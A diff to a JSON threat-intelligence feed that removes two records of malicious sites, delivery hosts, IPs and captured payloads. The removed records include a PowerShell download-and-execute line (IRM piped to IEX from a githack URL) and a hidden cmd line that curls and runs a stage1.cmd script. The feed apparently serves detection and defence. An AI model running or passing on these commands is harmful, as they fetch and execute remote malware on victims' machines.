@@ -9172,39 +9172,5 @@
     ],
     "ReportId": "cmw9j217600v80omls8fciut4",
     "ScannedAt": "2026-11-09T17:20:47.752000+00:00"
-  },
-  {
-    "UrlDomain": "utlin.com",
-    "DeliveryUrl": [
-      "gl.githack.com"
-    ],
-    "PayloadUrl": [],
-    "IP": [
-      "188.114.96.0"
-    ],
-    "Related": [],
-    "Payload": "IRM gl[.]githack[.]com/wiktor1992/53ffa7-d630-49af-a405-7e7278271132/-/raw/main/30-9434283BDFec | IEX",
-    "ResolvedDownloadUrl": [
-      "https://gl.githack.com/wiktor1992/53ffa7-d630-49af-a405-7e7278271132/-/raw/main/30-9434283BDFec"
-    ],
-    "ReportId": "cmw9g3lxz00h00oml615sax5b",
-    "ScannedAt": "2026-11-09T15:58:02.213000+00:00"
-  },
-  {
-    "UrlDomain": "st-shop.nl",
-    "DeliveryUrl": [
-      "physioga.net"
-    ],
-    "PayloadUrl": [
-      "https://physioga.net/u/stage1.cmd&%tmp%"
-    ],
-    "IP": [
-      "192.124.249.84"
-    ],
-    "Related": [],
-    "Payload": "cmd /c start /min cmd /c \"curl -sko %tmp%\\\\~u.cmd https://' + SCRIPTS_DOMAIN + '/u/stage1.cmd&%tmp%\\\\~u.cmd\"",
-    "ResolvedDownloadUrl": [],
-    "ReportId": "cmw9g2kme00et0omlszyw2f1j",
-    "ScannedAt": "2026-11-09T15:57:14.031000+00:00"
   }
 ]
